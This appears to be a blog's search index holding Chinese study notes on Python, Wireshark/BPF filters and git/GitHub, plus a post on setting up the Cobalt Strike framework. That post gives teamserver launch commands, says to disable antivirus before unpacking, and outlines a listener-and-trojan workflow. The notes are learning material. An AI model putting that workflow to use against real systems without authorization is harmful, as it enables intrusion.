<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python编程：从入门到实践</title>
      <link href="2020/10/22/Python%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/"/>
      <url>2020/10/22/Python%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a><strong>特性</strong></h1><p>能够发现字符串中额外的空白；</p><p>python3中print是一个函数，python2中的print语句可以不用括号；</p><p>python2整数除法只包含整数部分，小数部分被删除；</p><p>注释用#标识；</p><p>**表示次方；</p><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong>列表</strong></h1><p>方括号表示列表，逗号分隔；</p><p>直接打印，包括方括号；</p><p>-1表示列表最后一个元素；</p><p>元素修改</p><ul><li>添加元素append方法和insert方法</li><li>删除元素del语句、pop方法（弹出（pop）：列表像一个栈，删除末尾元素相当于弹出栈元素）、remove方法（只删除第一个指定的值）</li></ul><p>注：删除元素不再使用就用del语句，还要使用就用pop方法，不知道删除值所在位置用remove方法</p><p>组织列表</p><ul><li>sort、sorted方法让元素按照字母顺序排列传入reverse=True</li><li>reverse方法反转列表元素排列顺序</li></ul><p>列表操作：</p><ul><li>遍历整个列表for循环（for X in Xs）</li></ul><p>数值列表：</p><ul><li>用range方法生成一组数字（range(开始,结束,步长)），用list()函数将range方法结果转成列表</li><li>用min、max、sum函数可以对数字列表统计计算</li><li>列表解析：[表达式 for循环]</li><li>列表切片[起始:结束]，复制列表时[:]</li><li>元组：不可变的列表用圆括号不用方括号</li></ul><p>检查在列表中的值用’值’in列表名不在用not in</p><h1 id="字典（键名要用单引号括起来）"><a href="#字典（键名要用单引号括起来）" class="headerlink" title="字典（键名要用单引号括起来）"></a><strong>字典（键名要用单引号括起来）</strong></h1><p>定义：{花括号中的键与值对,键与值用冒号分隔,键值对用逗号}</p><p>访问：字典名[方括号键名]</p><p>添加：字典名[方括号括键和值]</p><p>（注：排列顺序与添加顺序不同）</p><p>修改：字典名[方括号键名]=新值</p><p>删除：del 字典名[方括号键名]</p><p>遍历：遍历所有键-值对item方法，遍历键keys方法，遍历值values方法</p><p>（注：默认遍历键）</p><p>嵌套：字典中嵌套字典</p><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a><strong>集合</strong></h1><p>类似于列表，但每个元素都是独一无二的用set()函数</p><h1 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a><strong>用户输入</strong></h1><p>input()函数</p><p>input(“括号内写入提示语句,输入的是字符串”) ；</p><p>python2中raw_input()函数与python3中input()函数相同，input()函数将用户输入读为python代码；</p><p>求余符号可用来确定该数是否为整数倍 ；</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h1><p>函数名全部小写用_连接</p><p>函数定义：def 函数名(变量):</p><p>文档字符串（DocStrings）用三引号（单双引号都行）括起，描述了函数的作用，DocStrings 文档字符串使用惯例：首行简述函数功能，第二行空行，第三行为函数的具体描述。函数名.<strong>doc</strong> 可以调用 doc；</p><p>传递实参的两种方法：位置实参和关键字实参；</p><p>函数中修改列表是永久性的；</p><p>创建列表副本fuction_name(list_name[:])防止函数修改列表；</p><p>传递任意数量的实参：将形参名前加*创建一个空元组并将所有值都封装到这个元组；</p><p>传递任意数量的关键字实参（键-值对）：将形参名前加**创建一个空字典并将所有名称—值对封装到这个字典；</p><p>导入模块：</p><ul><li>导入整个模块：import 模块名 导入，调用时 模块名.函数名（module_name.function_name()）</li><li>导入特定函数：from 模块名 import 函数名,函数名（from  module_name import function_0,function_1）导入，调用时不用句点直接使用函数名</li><li>使用as给函数指定别名：from module_name import function_name as fn</li><li>使用as给模块指定别名：import moudle_name as mn</li><li>导入模块中的所有函数：*导入模块中所有的函数 from module_name import * 导入，调用时不用句点</li></ul><p>注：最好不要使用导入模块中的函数防止函数重名</p><h1 id="类"><a href="#类" class="headerlink" title="类"></a><strong>类</strong></h1><p>类名首字母大写</p><p>方法<strong>init</strong>()（开头末尾有两个下划线）必定包含形参self</p><p>init初始化，特殊方法，自动运行，self自动传入实参，指向实例本身让实例能够访问类中的属性和方法</p><p>self前缀的变量供类中所有方法使用，类中任何实例都可以访问这些变量</p><p>python2创建类在括号中加单词object</p><p>通过实例访问的变量称为属性</p><p>小写的名称指根据类创建的实例</p><p>修改属性的值：</p><ul><li>直接通过实例进行修改：通过实例访问修改</li><li>通过方法进行设置：</li><li>通过方法进行递增（增加特定的值）</li></ul><p>继承：super()函数，将父类和子类联系起来，父类也称为超类（superclass），因此得名。super().<strong>init</strong>(形参)</p><p>python2中继承：super(子类名,self).<strong>init</strong>(形参)，定义父类括号内指定object</p><p>重写父类的方法：与重写父类方法同名</p><p>导入类：将类存储在模块中，在主程序中导入所需模块</p><p>类编码风格：类名中每个单词的首字母大写，不适用下划线，实例名和模块名小写，单词间加下划线，在类定义后面加一个文档字符串，简要描述类功能。</p><p>在类中使用一个空格分隔方法，在模块中，使用两个空格分隔类，先导入标准库模块后加一个空格，导入自己的模块</p><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a><strong>文件</strong></h1><p>****读取文件：</p><ul><li>with open(‘文件路径和文件名’) as 对象名:<ul><li>win路径用\ liunx和macos用/</li><li>防止\转义可以在开头的引号加上r</li></ul></li><li>整个文件读取时使用read()方法：对象名.read()</li><li>逐行读取用for循环：for line in 对象名</li></ul><p>注：用rstrip()删除多余的空格</p><p>读取到的所有值为字符串，需要数值使用时，用int()等函数转换</p><p>写入文件：</p><ul><li>with poen(‘文件路径和文件名’,’w’) as 对象名:<ul><li>r只读 w写入 a附加 r+读取和写入，默认为r</li><li>w打开已经存在的文件会覆盖原文件</li></ul></li><li>写入用write()方法：对象名.write()</li><li>换行需要加换行符</li></ul><p>注：只能将字符串写入文件，需要写入数值时，用str()转换</p><h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a><strong>异常</strong></h1><p>处理异常：try-excpet-else代码块</p><p>注：pass语句可以作为占位符</p><p>json模块对数据的操作：</p><p>json.dump()：第一个参数是存储的数据，第二个参数是存储的文件对象</p><p>json.load()：参数是存储的文件对象、</p><p>重构：将代码功能逻辑写的更清晰</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a><strong>测试</strong></h1><p>单元测试：检验某个函数的功能</p><p>测试用例：一组单元测试，测试各种情形下函数的行为</p><p>全覆盖测试：一整套单元测试</p><p>创建测试用例：</p><p>import unittest    //导入unittest模块</p><p>导入要测试的函数</p><p>class TestCase(unittest.TestCase)://创建一个继承unittest.TestCase的类，类名最好包含Test</p><p>编写一系列方法对函数行为测试 方法名以test开头</p><p>运行该文件时 test开头的方法都能自动运行</p><p>self.assert表达式()    //断言，判断结果是否和期望值相同</p><p>unittest.main()    //运行测试</p><p>setUp()方法：</p><p>def setUp(self):</p><p>运行测试用例，测试通过打印一个句点，错误打印一个E，断言失败打印一个F</p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h1><p>title()：将每个单词的首字母改为大写</p><p>upper()：字符串改为全部大写</p><p>lower()：字符串改为全部小写</p><p>rstrip()：暂时删除末尾的空白</p><p>lstrip()：暂时删除开头的空白</p><p>strip()：删除字符串两端的空白</p><p>str()：将非字符串值表示为字符串</p><p>append()：将元素添加到列表末尾</p><p>insert()：任意位置添加元素</p><p>pop()：删除末尾元素并能接着使用</p><p>remove()：根据值删除元素</p><p>sort()：永久性排序</p><p>sorted()：临时性排序</p><p>reverse()：反转列表元素</p><p>line()：获得列表长度</p><p>range()：打印一列数字</p><p>list()：将range()结果转成列表</p><p>min()、max()、sum()：对数字列表统计计算</p><p>items()：使字典返回键值对列表</p><p>keys()：使字典返回键</p><p>values()：使字典返回值</p><p>read()：读取文件内容</p><p>readlines()：读取文件每一行</p><p>write()：文件写入内容</p><p>split()：用空格为分隔符将字符串分为多个部分，将每一个部分存储到一个列表</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a><strong>附录</strong></h1><p>关键字和内置函数：</p><p>python2.7中，print是关键字不是函数，python3中没有内置函数unicode()</p>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobal strike了解</title>
      <link href="2020/10/22/Cobal%20strike%E4%BA%86%E8%A7%A3/"/>
      <url>2020/10/22/Cobal%20strike%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="一、软件安装"><a href="#一、软件安装" class="headerlink" title="一、软件安装"></a>一、软件安装</h1><p> 0.注意事项：</p><p> Cobalt Strike 需要Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11环境。</p><p> 解压前关闭杀毒软件。</p><h2 id="1-kali-java环境配置"><a href="#1-kali-java环境配置" class="headerlink" title="1.kali java环境配置"></a>1.kali java环境配置</h2><p> <strong>a.下载deb包安装</strong></p><p> 或下载压缩包解压文件并移动至/opt</p><p> tar -xzvf jdkxxxx.tar.gz（xxxx之自己所下载版本名称）</p><p> mv xxxx /opt</p><p> cd /opt/xxxx</p><p> <strong>b.设置环境变量</strong></p><p> 执行 vim ~/.bashrc ，添加下列内容</p><p>install JAVA JDK</p><p>export JAVA_HOME= /usr/lib/jvm/javaxxxx/（默认安装位置，如果是解压则是/opt/jdkxxxx）</p><p> export CLASSPATH=.:${JAVA_HOME}/lib</p><p> export PATH=${JAVA_HOME}/bin:$PATH</p><p> 保存退出</p><p> 执行 source ~/.bashrc</p><p> <strong>c.安装并注册</strong></p><p> update-alternatives –install /usr/bin/java java /opt/jdkxxxx/bin/java 1</p><p> update-alternatives –install /usr/bin/javac javac /opt/jdkxxxx/bin/javac 1</p><p> update-alternatives –set java /opt/jdkxxxx/bin/java</p><p> update-alternatives –set javac /opt/jdkxxxx/bin/javac（加粗字体根据实际安装路径填写）</p><p> 运行java -version查看安装是否成功</p><p> 注：如果运行报错</p><p> 是系统原有的OpenJDK设置干扰了手动安装的JDK</p><p> 解决办法：在环境变量里添加unset _JAVA_OPTIONS</p><p> vim ~/.bashrc 添加unset _JAVA_OPTINOS后重启</p><h2 id="2-安装cs（cs可以在Windows、Liunx、MacOS中使用，大致方法相同）"><a href="#2-安装cs（cs可以在Windows、Liunx、MacOS中使用，大致方法相同）" class="headerlink" title="2.安装cs（cs可以在Windows、Liunx、MacOS中使用，大致方法相同）"></a>2.安装cs（cs可以在Windows、Liunx、MacOS中使用，大致方法相同）</h2><p> 以下以kali使用为例</p><p> a.将cs包解压之后拷贝至kali中</p><p> b.运行团队服务器teamserver</p><p> ./teamserver 本机ip 密码</p><p> c.运行客户端</p><p> java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</p><p> 输入刚才的密码连接即可</p><h1 id="二、基本介绍"><a href="#二、基本介绍" class="headerlink" title="二、基本介绍"></a>二、基本介绍</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><ul><li>agscript：拓展应用的脚本</li><li>c2lint：用于检查profile的错误异常</li><li>teamserver：服务端程序</li><li>cobaltstrike：客户端程序</li><li>license.pdf：许可证文件</li><li>logs：目标记录与目标主机的相关信息</li><li>update：更新</li><li>third-party：第三方工具</li></ul><h2 id="2-基本流程"><a href="#2-基本流程" class="headerlink" title="2.基本流程"></a>2.基本流程</h2><ol><li>创建监听器</li><li>生成木马</li><li>开启web服务</li><li>运行木马</li><li>导出报告</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark过滤语法</title>
      <link href="2020/10/22/Wireshark%E8%BF%87%E6%BB%A4%E8%AF%AD%E6%B3%95/"/>
      <url>2020/10/22/Wireshark%E8%BF%87%E6%BB%A4%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一、显示过滤器"><a href="#一、显示过滤器" class="headerlink" title="一、显示过滤器"></a>一、显示过滤器</h1><table><thead><tr><th align="left">语法</th><th align="left">Protocol</th><th align="left">String1</th><th align="left">Comparison operator</th><th align="left">Value</th><th align="left">Logical Operations</th><th align="left">Other expression</th></tr></thead><tbody><tr><td align="left">例子</td><td align="left">http</td><td align="left">request</td><td align="left">==</td><td align="left">POST</td><td align="left">or</td><td align="left">icmp.type</td></tr></tbody></table><h1 id="二、捕获过滤器"><a href="#二、捕获过滤器" class="headerlink" title="二、捕获过滤器"></a>二、捕获过滤器</h1><table><thead><tr><th align="left">语法</th><th align="left">Protocol</th><th align="left">Direction</th><th align="left">Host（s）</th><th align="left">Value</th><th align="left">Logical Operations</th><th align="left">Other expression</th></tr></thead><tbody><tr><td align="left">例子</td><td align="left">tcp</td><td align="left">dst</td><td align="left">10.1.1.1</td><td align="left">80</td><td align="left">and</td><td align="left">tcp dst 10.2.2.2</td></tr></tbody></table><p>字段详解：</p><ul><li>Protocol（协议）：<ul><li>值：ether，fddi，ip，arp，rarp，decnet，lat，sca，moprc，mopdl，tcp，udp等</li><li>没指明协议类型，默认为捕捉所有支持的协议。</li><li>注：在wireshark的HELP-Manual Pages-Wireshark Filter中查到其支持的协议。</li></ul></li><li>Direction（方向）：<ul><li>值: src，dst，src and dst，src or dst等</li><li>没指明方向，默认为“src or dst” 作为关键字。</li><li>“host 10.2.2.2″与”src or dst host 10.2.2.2″等价。</li></ul></li><li>Host(s)：<ul><li>值：net, port, host, portrange等</li><li>没指明，默认为”host”关键字。</li></ul></li><li>Logical Operations（逻辑运算）：<ul><li>值：not，and，or等</li></ul></li></ul><h1 id="三、过滤关键字"><a href="#三、过滤关键字" class="headerlink" title="三、过滤关键字"></a>三、过滤关键字</h1><p>|字符|描述|<br>|:—-:|:—-|:—-:|:—-|<br>|eq,==|等于|<br>|ne,!=|不等于|<br>|gt,&gt;|大于|<br>|lt,&lt;|小于|<br>|ge,&gt;=|大于等于|<br>|le,&lt;=|小于等于|<br>|and,&amp;&amp;|且|<br>|or,||或|<br>|not,!|取反|</p><h1 id="四、伯克利包过滤语言（BPF）"><a href="#四、伯克利包过滤语言（BPF）" class="headerlink" title="四、伯克利包过滤语言（BPF）"></a>四、伯克利包过滤语言（BPF）</h1><h2 id="BPF基元"><a href="#BPF基元" class="headerlink" title="BPF基元"></a>BPF基元</h2><p>由一个id（名称或序号）加一个或多个限定符</p><ul><li>type限定符：规定了id名或id序号指的是哪种类型的数据，type有host、net、prot和protrange</li><li>dir限定符：规定了流量是从id流进还是流出。dir有src、dst、src or dst、src and dst、addr</li><li>Proto限定符：规定了所匹配的协议。proto有ether、fddi、tr、wlan、ip、ip6、arp、rarp、decnet、tcp和udp</li></ul><h2 id="常用BPF基元"><a href="#常用BPF基元" class="headerlink" title="常用BPF基元"></a>常用BPF基元</h2><ul><li>host id , dst host id , src host id</li><li>net id , dst net id , src net id</li><li>ether host id , ether dst host id , ether src host id</li><li>port id , dst port id , src port id</li><li>gateway id , ip proto id , ether proto id</li><li>cp, udp, icmp, arp</li><li>vlan id</li></ul><h2 id="根据字节的值过滤数据包"><a href="#根据字节的值过滤数据包" class="headerlink" title="根据字节的值过滤数据包"></a>根据字节的值过滤数据包</h2><p>检查帧内任意一个单字节字段（或多字节字段）的值是不是规定值。</p><p>eg：ip[8]&lt;64</p><p>这个过滤规则规定要抓取的是：所有自ip头偏移8个字节的那个单字节字段的值小于64的IP包。被检查的这个字段表示的是“包的存活时间”或称“TTL”。大多数Windows系统中TTL的默认值是128，所以这个过滤规则将丢弃局域网中所有来自Windows系统的流量，只获取所有来自Linux系统的流量</p><h2 id="根据位的值过滤数据包："><a href="#根据位的值过滤数据包：" class="headerlink" title="根据位的值过滤数据包："></a>根据位的值过滤数据包：</h2><p>先引用相关的字节，或多个字节，然后再用“位掩码”逐位地把我们需要检查的位分离出来</p><p>eg：ip[6] &amp; 0x40 != 0</p><p>找出所有“不分片”标志位（位于IP头部偏移6个字节位置上的一位二进制位）被置1的IP包，我们亦可用二进制位掩码“01000000”（0x40）来表示我们只关心IP头部偏移6个字节位置上那个第二最高位的bit值是是不是1。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git和Github使用教程</title>
      <link href="2020/10/22/git%E5%92%8CGitHub%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>2020/10/22/git%E5%92%8CGitHub%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>注：本文主要内容参考自《GitHub入门与实践》（作者：大塚泓记）</p><h1 id="Git："><a href="#Git：" class="headerlink" title="Git："></a>Git：</h1><h2 id="1-功能"><a href="#1-功能" class="headerlink" title="1.功能"></a>1.功能</h2><p>分散型版本管理系统，可以管理更新的历史记录，方便恢复误删除，回滚到特定阶段等</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/gliMO8je5sUmDTJ.png" alt="Image.png"></p><p>（分散型系统示意图）</p><h2 id="2-安装（以Git-for-Windows为例）"><a href="#2-安装（以Git-for-Windows为例）" class="headerlink" title="2.安装（以Git for Windows为例）"></a>2.安装（以Git for Windows为例）</h2><ul><li>组件选择：已经默认勾选</li><li>选择编辑器：选择自己喜欢的编辑器</li><li>设置环境变量：选择”Use Git Bash only”：只会使用到Git中附属的Git Bash命令提示符；选择”Git from the command line and also from 3rd-party software”：不仅可以使用Git中的Git Bash还可以使用cmd和Powershell等（建议）</li><li>选择SSH和HTTPS项：默认选择</li><li>换行符处理：选择”Checkout Windows-style,commit Unix-style line endings”，换行符编辑时自动转换为CRLF（Windows中以此为换行的），提交时自动转换为LF（Github中公开的代码大部分以Mac和Linux中的LF为换行符）</li><li>Git Bash默认终端等后续设置：默认选择</li></ul><h2 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h2><h3 id="初始设置"><a href="#初始设置" class="headerlink" title="初始设置"></a>初始设置</h3><ul><li>设置姓名和邮箱地址（设置的姓名邮箱地址会用在Git提交日志中，由于Github上公开仓库时，姓名和邮箱地址会随着日志一同被公开）：<ul><li>git config –global user.name “Firstname Lastname”</li><li>git config –global user.email “<a href="mailto:&#121;&#111;&#x75;&#114;&#95;&#101;&#x6d;&#97;&#x69;&#x6c;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;">&#121;&#111;&#x75;&#114;&#95;&#101;&#x6d;&#97;&#x69;&#x6c;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;</a>“</li></ul></li><li>提高命令输出可读性：<ul><li>git config –global color.ui auto</li></ul></li><li>上面两项设置可以直接在~/.gitconfig中修改</li></ul><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li>git init —— 初始化仓库<ul><li>使用git进行版本管理，需要初始化仓库</li><li>初始化命令<ul><li>建立一个目录：mkdir git（目录名）</li><li>进入文件夹：cd git（目录名 ）</li><li>初始化仓库：git init</li></ul></li><li>初始化成功后会在目录下生成.git目录。.git目录中存储着管理当前目录所需要的的仓库数据，该目录内容称为附属于该仓库的工作树</li></ul></li><li>git status —— 查看仓库的状态：可以查看仓库和工作树的状态</li><li>git add —— 向暂存区中添加文件</li><li>git commit —— 保存仓库的历史记录<ul><li>git commit -m “提交信息”  记述一行提交信息</li><li>git commit 记述详细提交信息<ul><li>格式<ul><li>第一行：简述提交更改内容</li><li>第二行：空行</li><li>第三行之后：记述更改的原因和详细内容</li></ul></li></ul></li><li>中止提交：提交空白信息关闭编辑器</li></ul></li><li>git log —— 查看提交日志（只显示当前状态为终点的历史日志）<ul><li>只显示提交信息的第一行：git log –pretty=short</li><li>只显示指定目录、文件名：git log 目录名/文件名</li><li>显示文件的改动：添加 -p 参数</li><li>退出时摁q结束</li></ul></li><li>git diff —— 查看更改前后的差别<ul><li>查看工作树和暂存区的区别：+是添加的行，-是删除的行</li><li>查看工作树和最新提交的差别：git diff HEAD（HEAD是一个指针，此时指是指向当前分支中的最新一次提交的指针）</li></ul></li></ul><h3 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h3><ul><li>git branch —— 显示分支一览表<ul><li>显示分支列表，并且确认自己所在的分支（自己所处的分支前面有*号）</li></ul></li><li>git checkout -b —— 创建、切换分支<ul><li>git checkout -b 分支名（创建并且切换到该分支）</li><li>上条命令效果等同于执行以下两条命令<ul><li>git branch 分支名（创建）</li><li>git checkout 分支名（切换）</li></ul></li><li>新分支的更改不会影响原分支</li><li>切换为上一个分支可以用 - 代替分支名</li></ul></li><li>特性分支：每一分支实现单一特性</li><li>主干分支：一般为master分支，是合并的终点</li><li>git merge —— 合并分支<ul><li>首先切到master（主干）分支</li><li>git merge –no-ff 合并分支名</li><li>不必修改直接保存关闭编辑器后合并完成</li></ul></li><li>git log –graph —— 以图表形式查看分支</li></ul><h3 id="更改提交的操作"><a href="#更改提交的操作" class="headerlink" title="更改提交的操作"></a>更改提交的操作</h3><ul><li>git reset  —— 回溯历史版本<ul><li>git reset –hard 版本哈希值（可通过git log查询）</li><li>回溯时可通过git reflog命令查看当前仓库的操作日志</li></ul></li><li>git commit –amend —— 修改提交信息<ul><li>–amend修改最新一次的提交信息</li><li>修改第n次的提交信息<ul><li>git rebase -i HEAD~n</li><li>将要修改commit前的pick改为edit，保存退出</li><li>git commit –amend</li><li>git rebase –continue</li></ul></li></ul></li><li>git rebase -i ——压缩历史<ul><li>git commit -am可以同时完成add和commit操作</li><li>将前n次内容选定git rebase -i HEAD~n</li><li>将pick改为fixup保存</li></ul></li></ul><h3 id="推送至远程仓库"><a href="#推送至远程仓库" class="headerlink" title="推送至远程仓库"></a>推送至远程仓库</h3><ul><li>git remote add —— 添加远程仓库<ul><li>git会将远程仓库的名称设置为origin（标识符）</li></ul></li><li>git push —— 推送至远程仓库<ul><li>-u参数，推送的同时将origin仓库的分支设置为本地仓库分支的upstream（上游）。在将来运行git pull命令从远程仓库获取内容时，本地这个分支就可以直接从orgin的master分支获取内容</li><li>推送时分支名区分大小写</li></ul></li></ul><h3 id="从远程仓库获取"><a href="#从远程仓库获取" class="headerlink" title="从远程仓库获取"></a>从远程仓库获取</h3><ul><li>git clone —— 获取远程仓库<ul><li>默认在master分支，并且将origin设置为远程仓库的标识符。</li><li>git branch -a 可以同时显示本地仓库和远程仓库的分支信息</li><li>获取远程的别的分支<ul><li>git checkout -b 本地新分支名 origin/远程分支名</li></ul></li></ul></li><li>git pull —— 获取最新的远程仓库分支<ul><li>git pull origin 分支名</li></ul></li></ul><h2 id="4-git学习"><a href="#4-git学习" class="headerlink" title="4.git学习"></a>4.git学习</h2><p>Pro git 学习文档<a href="https://www.progit.cn/">https://www.progit.cn</a></p><p>LearnGitBranching 实验学习<a href="https://learngitbranching.js.org/?locale=zh_CN">https://learngitbranching.js.org/?locale=zh_CN</a></p><h1 id="GitHub："><a href="#GitHub：" class="headerlink" title="GitHub："></a>GitHub：</h1><h2 id="1-功能-1"><a href="#1-功能-1" class="headerlink" title="1.功能"></a>1.功能</h2><p>主要提供托管git仓库的平台</p><ul><li>Organization：统一管理账户和权限，团队开发使用organization账户</li><li>Isuue：将任务或问题分配给一个issue进行追踪和管理的功能</li><li>Wiki：任何人对一篇文章进行更改和保存，实现多人完成一篇文章。</li><li>Pull Reuqest：向其他人的仓库提出申请并请求合并</li><li>其他功能<ul><li>Insights：各种视图查看项目情况</li><li>Settings：对仓库进行设置</li></ul></li></ul><h2 id="2-介绍"><a href="#2-介绍" class="headerlink" title="2.介绍"></a>2.介绍</h2><ul><li><p>创建仓库页面</p><ul><li>Repository name：仓库名称</li><li>Description：仓库说明描述，非必填项</li><li>Public、Private：访问权限，private为收费服务</li><li>Initialize this repository with a README：打勾后Github会自动初始化仓库并设置README文件，用户可以立刻clone这个仓库，如果想添加已有的git仓库，建议不勾选，手动push</li><li>Add .gitignore：选择初始化生成的.gitignore文件，帮我们把不需要在git仓库中进行版本管理的文件记录在该文件中，省去每次都要根据框架设置的麻烦。选择项包括主要的语言框架</li><li>Add a license：选择添加的许可协议文件</li></ul></li><li><p>连接仓库：</p><ul><li>README.md：文件内容会自动显示在仓库首页。一般会在文件中标明本仓库所含的软件的概要、使用流程、许可协议等信息</li><li>Github Flavored Markdown：Github上Issue、评论、Wiki都可以用到Markdown语法</li></ul></li><li><p>键盘快捷键：每个页面下shift + / 都可以打开键盘快捷键一览表</p></li><li><p>仓库</p><ul><li>仓库页面t键可以直接搜索目录或文件</li><li>查看差别可以通过直接修改URL<ul><li>查看分支差别加   分支名…分支名</li><li>查看与前几天的差别   分支名@{7.day.ago}…分支名</li><li>查看与指定日期之间的差别   分支名@{2020-01-01}…分支名</li></ul></li></ul></li><li><p>Issue</p><ul><li><p>发现软件BUG并报告向作者询问、探讨 列出准备实施的任务</p></li><li><p>Tasklist语法类似于任务清单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 要完成的任务</span><br><span class="line">- [] 任务一</span><br><span class="line">- [] 任务二</span><br><span class="line">- [x] 任务三</span><br></pre></td></tr></table></figure></li><li><p>Issue提交时加#编号会关联编号对应的Issue，添加close #编号等会完成指令</p></li><li><p>将Issue转换为Pull Request：编号互相通用</p></li></ul></li><li><p>Pull Request</p><ul><li>Conversation中用R直接引用别人的评论</li><li>Files Changed在URL末尾加 ?w=1 就可以不显示空格的差别</li></ul></li></ul><h2 id="3-使用-1"><a href="#3-使用-1" class="headerlink" title="3.使用"></a>3.使用</h2><ul><li>使用前设置<ul><li>设置SSH Key（Github连接已有仓库（Git）时的认证需要通过SSH的公开密钥认证方式进行）：<ul><li>ssh -keygen -t rsa -C “<a href="mailto:&#121;&#x6f;&#117;&#x72;&#95;&#101;&#109;&#97;&#x69;&#x6c;&#64;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x63;&#111;&#109;">&#121;&#x6f;&#117;&#x72;&#95;&#101;&#109;&#97;&#x69;&#x6c;&#64;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x63;&#111;&#109;</a>“（创建账户时使用的邮箱）</li><li>输入key的保存路径回车为默认路径</li><li>输入密码</li><li>再次输入密码（密码需要在认证时输入）</li><li>id_rsa 文件是私钥，id_rsa.pub是公钥</li></ul></li><li>添加公开密钥<ul><li>在Github账户设置中添加SSH keys。Title中输入密钥名称，Key中粘贴id_rsa.pub文件中的内容<ul><li>通过cat ~/.ssh/id_rsa.pub查看（复制从ssh -rsd到邮箱前的所有内容）</li></ul></li><li>使用私钥与GitHub认证通信<ul><li>ssh -t<a href="mailto:git@github.com">git@github.com</a></li><li>输入yes</li><li>输入设置密码</li></ul></li></ul></li></ul></li><li>创建仓库：New repository</li><li>==公开代码：<ul><li>clone已有仓库：git clone SSH clone URL（可以使用SSH或者HTTPS链接）</li><li>进入clone后的仓库：cd repository name</li><li>提交（将代码文件提交至仓库，进行入版本管理系统）<ul><li>git add 代码文件名（add 命令将文件加入暂存区）</li><li>git commit -m “提交信息，对这次提交的概述”（commit命令提交）</li></ul></li><li>进行push：git push（push后github上的仓库就会被更新）==</li></ul></li><li>Pull Request （PR）<ul><li>过程<ul><li>先Fork后clone</li><li>确认分支：开头加了 remotes/origin/ 的是Github端仓库的分支</li><li>创建分支：git checkout -b 新分支名 分支名 （和不加分支名的区别是创建的新分支是后面分支的分化</li><li>添加代码 提交修改 可以用 git diff命令查看是否修改正确</li><li>创建远程分支，检查是否创建添加代码完成</li><li>提交pull request</li></ul></li><li>规范<ul><li>添加[WIP]（Work In Progress）在正在开发的pull request前</li><li>有仓库编辑权限时可以不进行Fork直接clone</li></ul></li><li>仓库维护<ul><li>Fork和clone后进入本地仓库</li><li>给原仓库设置upstream名称 git remote add upstream git地址</li><li>获取数据：git fetch upstream（获取最新源代码）</li></ul></li></ul></li></ul><p>git merge upsteram/master（将远程仓库master 分支和本地当前分支合并）</p><ul><li>接受Pull Request<ul><li>直接接受 在网页Merge pull request</li><li>在本地环境进行<ul><li>更新仓库到最新状态</li><li>获取发送方的远程方库<ul><li>给原仓库设置PR发送者的名称 git remote add PR发送者 git地址</li><li>获取数据：git fetch PR发送者（获取最新源代码）</li><li>此时只获取了仓库以及数据，并没有建立分支</li></ul></li><li>创建用于检查的分支，合并，删除 git branch -D 分支名</li><li>合并到主分支，push</li></ul></li></ul></li><li>团队使用的开发流程<ul><li>公开项目<ul><li>Fork一个仓库</li><li>将Fork的仓库clone到本地开发环境</li><li>在本地环境中创建特性分支</li><li>对特性分支进行代码修改并提交</li><li>将特性代码push到仓库中</li><li>在Github对Fork来源仓库发送Pull 